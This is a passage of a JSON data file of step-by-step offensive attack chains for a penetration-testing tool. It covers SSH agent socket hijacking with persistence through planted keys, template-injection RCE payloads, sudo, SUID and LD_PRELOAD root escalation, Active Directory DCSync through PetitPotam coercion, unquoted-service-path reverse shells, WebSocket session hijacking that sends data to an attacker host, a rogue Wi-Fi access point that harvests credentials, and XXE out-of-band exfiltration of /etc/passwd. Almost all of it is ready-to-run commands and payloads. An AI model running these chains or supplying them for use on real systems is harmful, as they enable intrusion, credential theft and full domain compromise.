              "regex": "^(/tmp/ssh-[A-Za-z0-9]+/agent\\.\\d+)$",
              "match": "all"
            }
          ]
        },
        {
          "id": "hijack_socket",
          "name": "Hijack the agent socket and list keys",
          "inline_command": "export SSH_AUTH_SOCK=<socket_path>\nssh-add -L\n",
          "notes": "Output shows every key the agent holds (public + comment). If the\nuser has DA SSH keys / cloud bastion keys cached, they're yours.\nNo password prompt — the agent signs requests automatically.\n"
        },
        {
          "id": "enumerate_known_hosts",
          "name": "Find where these keys might work",
          "inline_command": "# Their known_hosts file (yours if they ran ssh from this box):\ncat /home/*/known_hosts 2>/dev/null\ncat /home/*/.ssh/known_hosts 2>/dev/null\n# Their SSH config — aliases & bastions:\ncat /home/*/.ssh/config 2>/dev/null\n"
        },
        {
          "id": "ssh_with_their_identity",
          "name": "SSH to a target using the hijacked agent",
          "inline_command": "export SSH_AUTH_SOCK=<socket_path>\nssh -A admin@bastion.internal\n# Once on bastion, continue chaining — the forwarding follows you.\n# If you can write to their .ssh/authorized_keys, drop YOUR key for\n# persistence:\ncat >> /home/<user>/.ssh/authorized_keys <<< 'ssh-ed25519 AAAA... attacker@evil'\n"
        },
        {
          "id": "persist_via_hidden_listener",
          "name": "Persist: leave a process that re-binds the socket later",
          "inline_command": "# When the admin's session ends, agent socket disappears. Snapshot\n# the keys NOW (you have to actually use them; the agent never gives\n# up raw key material). Use them to:\n# - Add your own key to authorized_keys on every reachable host\n# - Schedule a cron job that runs as you\n# - Drop an SSH ControlMaster persistent socket\n"
        },
        {
          "id": "agent_request_forwarding",
          "name": "Sign any blob using the agent (creative use)",
          "inline_command": "# ssh-agent will sign anything the protocol lets you send. SCP\n# uses an SSH session — but you can also abuse:\n# - git over SSH (push to GitHub as the admin)\n# - rsync over SSH (sync remote into your bucket)\n# - SFTP (download every file from servers reachable by their key)\nexport SSH_AUTH_SOCK=<socket_path>\ngit -c user.email='admin@target.com' clone git@github.com:org/internal-repo /tmp/loot\n"
        }
      ],
      "references": [
        {
          "title": "HackTricks — SSH socket hijack",
          "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ssh-agent-socket-hijack"
        },
        {
          "title": "OpenSSH agent forwarding caveats",
          "url": "https://man.openbsd.org/ssh#A"
        }
      ],
      "next_chains": [
        {
          "chain": "pivoting-chisel-ligolo",
          "when": "reached an internal-network bastion",
          "reason": "Tunnel back out to attack the internal subnet directly."
        },
        {
          "chain": "nmap-recon",
          "when": "now on a new host",
          "reason": "Repeat recon from the new vantage point."
        }
      ]
    },
    {
      "id": "ssti-to-rce",
      "name": "Web → Shell — Server-Side Template Injection (Jinja2 / Twig / FreeMarker)",
      "description": "Fingerprint the template engine, find a sandbox bypass, hit RCE. The classic 7×7 / ${{7*7}} test tells you which engine you're hitting, and the chosen-engine sandbox bypass gives you shell.\n",
      "tags": [
        "web",
        "ssti",
        "jinja",
        "twig",
        "freemarker",
        "rce"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_url",
          "description": "URL where reflected user input passes through a template engine.",
          "required": true
        },
        {
          "name": "parameter",
          "description": "Parameter name being templated."
        }
      ],
      "steps": [
        {
          "id": "fingerprint",
          "name": "Engine fingerprint (try all the syntaxes)",
          "inline_command": "# Try each — note which returns 49 (= 7*7):\ncurl '<url>?<p>={{7*7}}'         # Jinja2 / Twig / Liquid\ncurl '<url>?<p>=${7*7}'          # FreeMarker / Velocity / SpEL\ncurl '<url>?<p>=<%= 7*7 %>'      # ERB (Ruby)\ncurl '<url>?<p>=#{7*7}'          # Smarty / Spring\ncurl '<url>?<p>={{ self }}'      # Jinja2 (shows the env)\n",
          "inputs": {
            "url": "${target_url}",
            "p": "${parameter}"
          },
          "notes": "The differentiator is the second-line probe:\n  Jinja2 → `{{ config.items() }}` shows app config\n  Twig   → `{{ _self.env }}` exposes the env\n  FreeMarker → `${\"freemarker.template.utility.Execute\"?new()(\"id\")}`\n"
        },
        {
          "id": "jinja2_rce",
          "name": "Jinja2 / Flask RCE (escape sandbox)",
          "inline_command": "curl '<url>?<p>={{cycler.__init__.__globals__.os.popen(\"id\").read()}}'",
          "inputs": {
            "url": "${target_url}",
            "p": "${parameter}"
          },
          "notes": "Modern Jinja2 sandbox escape via cycler. Older payloads:\n  {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}\nThe subclass index varies — enumerate with `__subclasses__()`.\n"
        },
        {
          "id": "twig_rce",
          "name": "Twig RCE",
          "inline_command": "curl '<url>?<p>={{[\"id\"]|filter(\"system\")}}'",
          "inputs": {
            "url": "${target_url}",
            "p": "${parameter}"
          }
        },
        {
          "id": "freemarker_rce",
          "name": "FreeMarker RCE",
          "inline_command": "curl '<url>?<p>=<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }'",
          "inputs": {
            "url": "${target_url}",
            "p": "${parameter}"
          }
        },
        {
          "id": "rev_shell",
          "name": "Pop a reverse shell once RCE works",
          "inline_command": "# Replace `id` with one of the rsg-* commands (bash -i revshell). URL-encode + escape quotes carefully.",
          "notes": "Pair with WannaHack's commands/payloads/ (rsg-reverseshell-bash-i,\nrsg-reverseshell-python-1, etc). For most engines, a simple base64\nof the bash payload avoids quoting nightmares.\n"
        }
      ],
      "references": [
        {
          "title": "PortSwigger — SSTI",
          "url": "https://portswigger.net/research/server-side-template-injection"
        },
        {
          "title": "HackTricks — SSTI",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html"
        }
      ],
      "next_chains": [
        {
          "chain": "shell-stabilization",
          "reason": "Stabilize the resulting shell."
        },
        {
          "chain": "linux-priv-esc-recon",
          "when": "shell on Linux",
          "reason": "Escalate."
        }
      ]
    },
    {
      "id": "sudo-gtfobins-escalation",
      "name": "Linux PE — sudo allowed binary → GTFOBins → root",
      "description": "`sudo -l` returned a list. For each binary the user can sudo, GTFOBins has a one-liner that spawns a root shell or reads /etc/shadow. This chain bridges them.\n",
      "tags": [
        "linux",
        "priv-esc",
        "sudo",
        "gtfobins"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "sudo_allowed",
          "description": "From the linux-priv-esc-recon chain (or run sudo -l yourself)."
        }
      ],
      "steps": [
        {
          "id": "list_sudo",
          "name": "Re-list sudo allowances (in case it expired)",
          "inline_command": "sudo -l"
        },
        {
          "id": "open_gtfo_search",
          "name": "Look the binary up in WannaHack's GTFOBins library",
          "inline_command": "echo 'In WannaHack: switch to Commands mode, filter by \"gtfobins\", search for the binary name. Pick the sudo variant.'",
          "notes": "The GTFOBins KB sync gives every binary its own command entry under\ncommands/gtfobins/. Click Copy in the card and run it as the sudoers\nline allows.\n"
        },
        {
          "id": "typical_examples",
          "name": "Common quickwins (try these first)",
          "inline_command": "# find\nsudo find . -exec /bin/sh \\; -quit\n# vim\nsudo vim -c ':!/bin/sh'\n# nmap (interactive mode, old)\nsudo nmap --interactive\n# less / more / man\nsudo less /etc/profile  # then `!sh`\n# python\nsudo python -c 'import os; os.system(\"/bin/sh\")'\n# awk\nsudo awk 'BEGIN {system(\"/bin/sh\")}'\n",
          "notes": "90% of HTB/OSCP sudo abuses land on one of these. If yours isn't\nhere, hit GTFOBins.\n"
        },
        {
          "id": "env_keep_check",
          "name": "Check env_keep tricks (LD_PRELOAD / PYTHONPATH)",
          "inline_command": "sudo -l | grep env_keep",
          "notes": "`env_keep+=LD_PRELOAD` → compile a tiny .so that execve's /bin/sh,\n`sudo LD_PRELOAD=/tmp/x.so <any_allowed_program>`.\nSample .so:\n  #include <stdio.h>\n  #include <stdlib.h>\n  #include <unistd.h>\n  void _init() { unsetenv(\"LD_PRELOAD\"); setuid(0); execve(\"/bin/sh\", NULL, NULL); }\nCompile: gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c\n"
        },
        {
          "id": "confirm_root",
          "name": "Confirm root",
          "inline_command": "id",
          "notes": "Expected: `uid=0(root) gid=0(root) groups=0(root)`.\n"
        }
      ],
      "references": [
        {
          "title": "GTFOBins",
          "url": "https://gtfobins.github.io/"
        },
        {
          "title": "Sudo env_keep abuse",
          "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ld_preload"
        }
      ],
      "next_chains": [
        {
          "chain": "shell-stabilization",
          "when": "rooted shell is messy",
          "reason": "Upgrade the new root shell to a real TTY."
        }
      ]
    },
    {
      "id": "suid-binary-escalation",
      "name": "Linux PE — SUID binary abuse",
      "description": "SUID-root binary in the wild → check GTFOBins for the SUID variant. If a custom binary, reverse it for shell-out, env, or relative-path hijack opportunities.\n",
      "tags": [
        "linux",
        "priv-esc",
        "suid",
        "gtfobins"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "suid_binaries",
          "description": "Array from linux-priv-esc-recon (or run `find / -perm -4000` yourself)."
        }
      ],
      "steps": [
        {
          "id": "list_suid",
          "name": "Re-list SUID binaries",
          "inline_command": "find / -perm -4000 -type f 2>/dev/null",
          "capture": [
            {
              "var": "suid_binaries",
              "regex": "^(/[^\\s]+)$",
              "match": "all"
            }
          ]
        },
        {
          "id": "triage",
          "name": "Triage: GTFOBins-known vs custom",
          "inline_command": "echo 'Filter your SUID list against gtfobins/. Anything NOT in GTFOBins is likely custom — read it / ltrace it / strings it.'",
          "notes": "Known SUID quickwins (try first, all in commands/gtfobins/):\n • find        → -exec /bin/sh -p \\; -quit\n • cp          → overwrite /etc/shadow with attacker hash\n • python      → -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'\n • bash        → bash -p\n • nmap        → --interactive (old) / nse script\n • screen / tmux\n"
        },
        {
          "id": "custom_binary",
          "name": "Custom SUID — common vectors",
          "inline_command": "strings /path/to/binary | head -50; ltrace /path/to/binary 2>&1 | head -20",
          "notes": "Look for:\n  • system(\"ls\") with no abs path → PATH hijack (write `ls` in /tmp,\n    export PATH=/tmp:$PATH, run binary).\n  • execve(\"/bin/ls\", ...) with $LD_LIBRARY_PATH consulted → library\n    hijack.\n  • Reading config from $HOME/.something → symlink to /etc/shadow.\n  • Calling a wrapper script with relative path → write the wrapper.\n"
        },
        {
          "id": "env_abuse",
          "name": "PATH hijack example",
          "inline_command": "cat > /tmp/ls <<'EOF'\n#!/bin/sh\ncp /bin/bash /tmp/.r && chmod +s /tmp/.r\nEOF\nchmod +x /tmp/ls\nexport PATH=/tmp:$PATH\n/path/to/suid-binary  # triggers /tmp/ls as root\n/tmp/.r -p  # root shell\n",
          "notes": "Works whenever the SUID binary invokes another command via PATH lookup\n(e.g. system(\"ls\")) without setting a clean environment.\n"
        }
      ],
      "references": [
        {
          "title": "GTFOBins — SUID",
          "url": "https://gtfobins.github.io/#+suid"
        },
        {
          "title": "HackTricks — SUID escalation",
          "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#suid"
        }
      ],
      "next_chains": [
        {
          "chain": "shell-stabilization",
          "when": "rooted shell is messy",
          "reason": "Upgrade the new root shell."
        }
      ]
    },
    {
      "id": "unconstrained-delegation-printerbug",
      "name": "AD — Unconstrained delegation + PrinterBug (capture DC TGT)",
      "description": "When you own a host with TrustedForDelegation = TRUE, any service the host receives a Kerberos ticket for hands over a usable TGT for that account. PrinterBug/PetitPotam coerces the DC into authenticating to you, and you walk away with the DC's TGT (and therefore DCSync rights).\n",
      "tags": [
        "unconstrained-delegation",
        "printerbug",
        "petitpotam",
        "priv-esc",
        "kerberos"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "unconstrained_host",
          "description": "FQDN of the host you've compromised that has unconstrained delegation.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "confirm_unconstrained",
          "name": "Confirm the host is TrustedForDelegation",
          "command_ref": "nxc-ldap-find-delegation",
          "inputs": {
            "dc-ip": "${dc_ip}"
          },
          "notes": "Output should include `<unconstrained_host>$  Unconstrained  TrustedForDelegation`.\nIf only TRUSTED_TO_AUTH_FOR_DELEGATION appears, it's constrained, not\nunconstrained — use the constrained-delegation chain instead.\n"
        },
        {
          "id": "rubeus_monitor",
          "name": "Start a TGT monitor on the unconstrained host",
          "inline_command": "Rubeus.exe monitor /interval:5 /filteruser:<DC_NAME>$",
          "notes": "Run as SYSTEM on the compromised host. The filter limits noise to\nDC machine-account TGTs only. Leave it running while you fire the\ncoercer from another shell.\n"
        },
        {
          "id": "trigger_petitpotam",
          "name": "PetitPotam coerce the DC to authenticate to you",
          "command_ref": "nxc-smb-petitpotam",
          "inputs": {
            "ip": "${dc_ip}"
          },
          "notes": "If PetitPotam is patched try the PrinterBug RPC instead\n(`Coercer.py coerce -t <dc-ip> -l <unconstrained-host-ip>`).\nEither way the DC sends an NTLM/Kerberos auth to your monitor.\n"
        },
        {
          "id": "extract_tgt",
          "name": "Convert the captured base64 TGT → ccache",
          "inline_command": "echo '<base64_tgt_from_rubeus>' | base64 -d > dc.kirbi; ticketConverter.py dc.kirbi dc.ccache; export KRB5CCNAME=dc.ccache",
          "notes": "Rubeus prints the TGT as base64; ticketConverter from Impacket turns\nit into a ccache impacket tools accept.\n"
        },
        {
          "id": "dcsync",
          "name": "DCSync the entire domain with the DC's TGT",
          "inline_command": "impacket-secretsdump -k -no-pass -just-dc -outputfile dcsync '<domain>/<DC_NAME>$@<dc-ip>'",
          "inputs": {
            "domain": "${domain}",
            "dc-ip": "${dc_ip}"
          },
          "notes": "You now hold every NTLM hash and Kerberos key in the domain,\nincluding krbtgt → can mint Golden Tickets at will.\n"
        }
      ],
      "references": [
        {
          "title": "Unconstrained delegation abuse — Wagging the Dog",
          "url": "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html"
        },
        {
          "title": "PetitPotam",
          "url": "https://github.com/topotam/PetitPotam"
        }
      ],
      "next_chains": [
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "krbtgt via DCSync",
          "reason": "You DCSyncd — Golden Ticket time."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "ntlm_hashes captured",
          "reason": "You have everyone's hash — spread."
        }
      ]
    },
    {
      "id": "unquoted-service-path",
      "name": "Windows PE — unquoted service path → SYSTEM",
      "description": "A service whose binPath contains spaces but isn't quoted is exploitable when any intermediate directory is writable. Windows tries each prefix in turn (`C:\\Program Files\\App\\bin.exe` → try `C:\\Program.exe`, `C:\\Program Files\\App.exe`, etc.). Drop a malicious `.exe` and restart.\n",
      "tags": [
        "windows",
        "priv-esc",
        "services",
        "classic-windows"
      ],
      "difficulty": "easy",
      "inputs": [],
      "steps": [
        {
          "id": "find_unquoted",
          "name": "Find unquoted service paths",
          "inline_command": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\" | findstr /i /v \"\\\"\"",
          "notes": "Only services in AUTO start (or that you can restart) matter. The\ngrep filters out the protected windows\\\\ paths and any path already\nquoted.\n"
        },
        {
          "id": "check_writable",
          "name": "Check writability of each intermediate directory",
          "inline_command": "icacls \"C:\\Program Files\\Vulnerable Folder\"",
          "notes": "Look for `(F)` (full) or `(M)` (modify) on Users / Authenticated\nUsers / BUILTIN\\\\Users / the current account. Repeat per directory\nlevel in the path until you find one you can write.\n"
        },
        {
          "id": "stage_payload",
          "name": "Stage your payload as Program.exe / Service.exe etc.",
          "inline_command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o \"C:\\\\Program Files\\\\Vulnerable\\\\Program.exe\"\n",
          "inputs": {
            "lhost": "${attacker_ip}",
            "lport": "4444"
          },
          "notes": "The name must match the intermediate prefix. Example for path\n`C:\\Program Files\\Vulnerable Folder\\App\\bin.exe` with `Vulnerable Folder`\nwritable, drop `Vulnerable.exe` inside `C:\\Program Files\\`.\n"
        },
        {
          "id": "trigger",
          "name": "Restart the service (or wait for the next boot)",
          "inline_command": "sc stop <ServiceName>; sc start <ServiceName>",
          "notes": "If you can't restart it, use shutdown -r -t 0 / wait for cron-like\nrestart, or pick a service that runs on user logon.\n"
        },
        {
          "id": "catch_shell",
          "name": "Catch the SYSTEM reverse shell",
          "inline_command": "nc -lvnp <lport>",
          "inputs": {
            "lport": "4444"
          },
          "notes": "Use rlwrap nc for line editing. Stabilize the shell with\n`python -c 'import pty;pty.spawn(\\\"/bin/sh\\\")'` (n/a on Windows — use\nPowershell's Invoke-PowerShellTcp).\n"
        }
      ],
      "references": [
        {
          "title": "HackTricks — Unquoted Service Path",
          "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#unquoted-service-paths"
        }
      ],
      "next_chains": [
        {
          "chain": "dpapi-secrets-extraction",
          "reason": "SYSTEM shell — loot the box."
        }
      ]
    },
    {
      "id": "websocket-origin-bypass",
      "name": "Web — WebSocket cross-site hijacking (CSWSH) + origin bypass",
      "description": "WebSockets aren't subject to CORS — only the `Origin` header is checked (if at all). If the server doesn't enforce origin OR uses a permissive check, attacker site can open a WS connection riding the victim's cookies → bidirectional access to their authenticated session.\n",
      "tags": [
        "web",
        "websocket",
        "cswsh",
        "origin-bypass",
        "csrf"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "ws_endpoint",
          "description": "WebSocket URL (wss://target.com/ws).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "identify_ws",
          "name": "Identify WebSocket endpoints",
          "inline_command": "# In Burp/dev tools, watch for \"ws://\" or \"wss://\" connections.\n# Open the WS in browser dev tools → look at Frames tab to see message\n# shape (often JSON-RPC-like: {\"id\":1,\"method\":\"...\",\"params\":...}).\n# Also check JS source:\ncurl -s '<app>' | grep -oE 'wss?://[^\"]+'\n"
        },
        {
          "id": "origin_check_probe",
          "name": "Test Origin header enforcement",
          "inline_command": "# 1) Confirm normal connect works:\nwebsocat '<ws>' --header 'Origin: https://target.com' --header 'Cookie: session=<victim_cookie>'\n# 2) Try with attacker origin:\nwebsocat '<ws>' --header 'Origin: https://attacker.com' --header 'Cookie: session=<victim_cookie>'\n# 3) Try with no Origin (curl behavior):\nwebsocat '<ws>' --header 'Cookie: session=<victim_cookie>'\n",
          "inputs": {
            "ws": "${ws_endpoint}"
          },
          "notes": "If #2 or #3 still receives messages — CSWSH viable. If only #1 works\n→ origin is enforced; look for less-strict variants (null origin,\nsubdomain prefix/suffix bypasses).\n"
        },
        {
          "id": "craft_attack_page",
          "name": "Craft attacker-hosted page that hijacks WS",
          "inline_command": "cat > attack.html <<'EOF'\n<html><body>\n<script>\n  const ws = new WebSocket('<ws>');\n  ws.onopen = () => {\n    // Send any message the legit client would send:\n    ws.send(JSON.stringify({id:1, method:'getProfile'}));\n  };\n  ws.onmessage = (e) => {\n    // Exfil to attacker:\n    fetch('https://attacker.com/log?d=' + btoa(e.data));\n  };\n</script>\n</body></html>\nEOF\n# Host: python3 -m http.server 80\n# Lure victim to it while they're logged in to <ws_host>.\n",
          "inputs": {
            "ws": "${ws_endpoint}"
          }
        },
        {
          "id": "bypass_subdomain",
          "name": "Subdomain bypass: 'https://target.com' substring matching",
          "inline_command": "# If server checks Origin with startsWith('https://target.com') —\n# any URL starting with that string passes:\n#   https://target.com.attacker.com  →  passes the check\nwebsocat '<ws>' --header 'Origin: https://target.com.attacker.com' --header 'Cookie: session=<cookie>'\n",
          "inputs": {
            "ws": "${ws_endpoint}"
          }
        },
        {
          "id": "token_in_url_leak",
          "name": "If WS auth is via URL token (?token=...) → Referer leak",
          "inline_command": "# Many apps put bearer tokens in the WS URL itself; the URL ends up\n# in window.location and leaks via Referer to any image/script on\n# third-party domains.\n# Bonus: WS upgrade fetch is GET — server logs the full URL with token.\n"
        },
        {
          "id": "full_takeover",
          "name": "Bidirectional control → take over the session",
          "inline_command": "# From inside your attack.html, send the WS messages that:\n# - retrieve the victim's profile\n# - change their email\n# - trigger a password reset to attacker@evil.com\n# All of it rides the WS auth — same as logged-in user.\n"
        }
      ],
      "references": [
        {
          "title": "PortSwigger — WebSocket security",
          "url": "https://portswigger.net/web-security/websockets"
        },
        {
          "title": "HackTricks — WebSocket Attacks",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/websocket-attacks.html"
        }
      ],
      "next_chains": [
        {
          "chain": "csrf-and-token-leak",
          "when": "WS used for state-changing actions",
          "reason": "CSWSH is a CSRF variant — chain into broader CSRF audit."
        }
      ]
    },
    {
      "id": "windows-priv-esc-recon",
      "name": "Windows PE — recon (winpeas/seatbelt/whoami)",
      "description": "Standard Windows local-priv-esc enumeration. Tells you which of the classic escalation paths is open (token impersonation, service abuse, AlwaysInstallElevated, stored creds, scheduled tasks).\n",
      "tags": [
        "windows",
        "priv-esc",
        "recon",
        "post-exploitation"
      ],
      "difficulty": "easy",
      "inputs": [],
      "steps": [
        {
          "id": "whoami_priv",
          "name": "Show privileges & groups",
          "inline_command": "whoami /all",
          "notes": "SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege → Potato\nattack to SYSTEM. SeBackup / SeRestore → registry-hive dump.\nSeDebug → process memory access.\n",
          "capture": [
            {
              "var": "privs_enabled",
              "regex": "^(Se\\w+)\\s+\\S+\\s+(Enabled|Disabled)$",
              "match": "all",
              "groups": {
                "name": 1,
                "state": 2
              }
            }
          ]
        },
        {
          "id": "systeminfo",
          "name": "Patch level & arch",
          "inline_command": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" /C:\"Hotfix(s)\"",
          "notes": "Compare missing hotfixes against Sherlock/Watson DB. Old patch level\n+ x64 + no AV = kernel exploit candidate.\n"
        },
        {
          "id": "services",
          "name": "Vulnerable service config (unquoted/weakperm)",
          "inline_command": "wmic service get name,pathname,startname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\"",
          "notes": "Look for paths with spaces and no quotes → unquoted-service-path.\nThen check `icacls <path>` for `(F)` (full) or `(M)` (modify) on\nAuthenticated Users / Users.\n"
        },
        {
          "id": "alwaysinstallelevated",
          "name": "AlwaysInstallElevated check",
          "inline_command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n",
          "notes": "Both = 0x1 → craft an msi with msfvenom and `msiexec /quiet /i x.msi`\nto spawn SYSTEM.\n"
        },
        {
          "id": "stored_creds",
          "name": "Stored credentials",
          "inline_command": "cmdkey /list; dir /s C:\\Users\\*unattend* C:\\Users\\*sysprep* 2>nul",
          "notes": "cmdkey targets → `runas /savecred /user:<...> cmd.exe`. Unattend.xml\noften has cleartext local admin password (legacy deployments).\n"
        },
        {
          "id": "winpeas",
          "name": "winpeas (full sweep — read the RED items)",
          "inline_command": "powershell -c \"iwr https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe -OutFile winpeas.exe; .\\winpeas.exe\"",
          "notes": "Heavy but the RED tags are gold: AlwaysInstallElevated, Always Install,\nmissing patches, exploitable services, AutoLogon registry, etc.\n"
        }
      ],
      "references": [
        {
          "title": "HackTricks — Windows PE",
          "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
        },
        {
          "title": "PEASS-ng",
          "url": "https://github.com/peass-ng/PEASS-ng"
        }
      ],
      "next_chains": [
        {
          "chain": "seimpersonate-potato",
          "when": "privs include SeImpersonate",
          "reason": "The classic Potato escalation."
        },
        {
          "chain": "unquoted-service-path",
          "when": "unquoted service found",
          "reason": "Drop a payload at the truncated prefix."
        },
        {
          "chain": "alwaysinstallelevated",
          "when": "AlwaysInstallElevated registry = 1",
          "reason": "MSI elevation freebie."
        }
      ]
    },
    {
      "id": "wpa2-enterprise-eaphammer",
      "name": "Wireless — WPA2-Enterprise eaphammer rogue AP → cred harvest",
      "description": "WPA2-Enterprise networks let you set up a rogue AP with the same ESSID; client devices auto-associate and try to authenticate, leaking the MSCHAPv2 challenge/response (EAP-PEAP, EAP-TTLS). Crack offline.\n",
      "tags": [
        "wireless",
        "wpa2-enterprise",
        "eap",
        "mschapv2",
        "initial-access"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_essid",
          "description": "ESSID of the corporate Wi-Fi to impersonate.",
          "required": true
        },
        {
          "name": "wifi_interface",
          "description": "Your wireless adapter (must support AP/monitor mode, e.g. wlan1).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "install_eaphammer",
          "name": "Install eaphammer (one-time)",
          "inline_command": "git clone https://github.com/s0lst1c3/eaphammer /opt/eaphammer\ncd /opt/eaphammer && sudo ./kali-setup\n./eaphammer --cert-wizard  # creates a default cert\n"
        },
        {
          "id": "scan_for_target",
          "name": "Confirm target ESSID + signal strength",
          "inline_command": "sudo airodump-ng <iface>",
          "inputs": {
            "iface": "${wifi_interface}"
          }
        },
        {
          "id": "rogue_ap_attack",
          "name": "Launch the rogue AP (PEAP/MSCHAPv2 harvest)",
          "inline_command": "sudo ./eaphammer \\\n  --auth wpa-eap \\\n  --essid '<essid>' \\\n  --interface <iface> \\\n  --creds\n",
          "inputs": {
            "essid": "${target_essid}",
            "iface": "${wifi_interface}"
          },
          "notes": "Wait for victim devices to associate. Watch stdout for\n\"Username: <user>\" + \"Challenge: ...\" + \"Response: ...\" blocks —\none per leaked client.\n",
          "capture": [
            {
              "var": "mschapv2_handshake",
              "regex": "Username:\\s+(\\S+)\\s+Challenge:\\s+([a-f0-9]+)\\s+Response:\\s+([a-f0-9]+)",
              "match": "all",
              "groups": {
                "user": 1,
                "challenge": 2,
                "response": 3
              }
            }
          ]
        },
        {
          "id": "deauth_acceleration",
          "name": "Force clients to re-associate (deauth)",
          "inline_command": "# In another shell: deauth the target client(s) to trigger reconnect.\nsudo aireplay-ng --deauth 5 -a <ap_bssid> -c <client_mac> <iface>\n",
          "inputs": {
            "iface": "${wifi_interface}"
          }
        },
        {
          "id": "crack_offline",
          "name": "Crack MSCHAPv2 with asleap / hashcat",
          "inline_command": "# asleap (fastest for MSCHAPv2):\nasleap -C '<challenge>' -R '<response>' -W /usr/share/wordlists/rockyou.txt\n# Or hashcat mode 5500 (NetNTLMv1, same primitive):\nhashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt\n"
        }
      ],
      "references": [
        {
          "title": "eaphammer",
          "url": "https://github.com/s0lst1c3/eaphammer"
        },
        {
          "title": "MSCHAPv2 cracking",
          "url": "https://hashcat.net/wiki/doku.php?id=example_hashes"
        }
      ],
      "next_chains": [
        {
          "chain": "password-spray",
          "when": "cracked plaintext",
          "reason": "Corporate Wi-Fi creds usually map to AD users — spray to find Pwn3d!."
        },
        {
          "chain": "ldap-anonymous-enum",
          "when": "cracked plaintext + internal network access",
          "reason": "Now you can enumerate AD from inside."
        }
      ]
    },
    {
      "id": "xxe-to-file-read",
      "name": "Web — XXE → file read → escalate to SSRF/RCE",
      "description": "XML External Entity injection: feed the parser an external DTD or entity, exfiltrate files / hit internal endpoints. Java parsers are especially generous with file:// and http:// URI schemes.\n",
      "tags": [
        "web",
        "xxe",
        "xml",
        "file-disclosure",
        "ssrf"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_url",
          "description": "Endpoint that parses XML you control.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "baseline",
          "name": "Confirm XML is parsed (echo content)",
          "inline_command": "curl -X POST '<url>' \\\n  -H 'Content-Type: application/xml' \\\n  -d '<?xml version=\"1.0\"?><foo>HELLOWORLD</foo>'\n",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "If `HELLOWORLD` appears anywhere in the response → reflected XML\ncontent; XXE viable. If response is fully ignored, try blind XXE\nvia an out-of-band channel (interactsh/Burp Collaborator).\n"
        },
        {
          "id": "file_read",
          "name": "Read /etc/passwd via external entity",
          "inline_command": "curl -X POST '<url>' \\\n  -H 'Content-Type: application/xml' \\\n  -d '<?xml version=\"1.0\"?>\n      <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n      <foo>&xxe;</foo>'\n",
          "inputs": {
            "url": "${target_url}"
          }
        },
        {
          "id": "read_app_source",
          "name": "Read app source (PHP via base64 wrapper)",
          "inline_command": "curl -X POST '<url>' \\\n  -H 'Content-Type: application/xml' \\\n  -d '<?xml version=\"1.0\"?>\n      <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]>\n      <foo>&xxe;</foo>'\n",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "base64-decode the result to read PHP source — find db creds, more\nendpoints, secret keys. Same trick works for Java with the `jar://`\nscheme to read JAR contents.\n"
        },
        {
          "id": "blind_xxe_oob",
          "name": "Blind XXE — out-of-band exfil via external DTD",
          "inline_command": "# 1) Host this DTD on your attacker box (python3 -m http.server 80):\ncat > evil.dtd <<'EOF'\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://<lhost>/?d=%file;'>\">\n%eval;\n%exfil;\nEOF\n# 2) Inject the loader:\ncurl -X POST '<url>' \\\n  -H 'Content-Type: application/xml' \\\n  -d '<?xml version=\"1.0\"?>\n      <!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://<lhost>/evil.dtd\"> %dtd;]>\n      <foo>x</foo>'\n",
          "inputs": {
            "url": "${target_url}",
            "lhost": "${attacker_ip}"
          },
          "notes": "Works when the parser blocks direct echo but still resolves remote\nDTDs. Your web log will show `GET /?d=<base64-passwd>`. Some parsers\nreject `%file;` interpolation in URL params — use FTP exfil instead\n(run a small ftpserver.py to grab data via FTP URLs).\n"
        },
        {
          "id": "ssrf_pivot",
          "name": "Use XXE as SSRF → hit internal services",
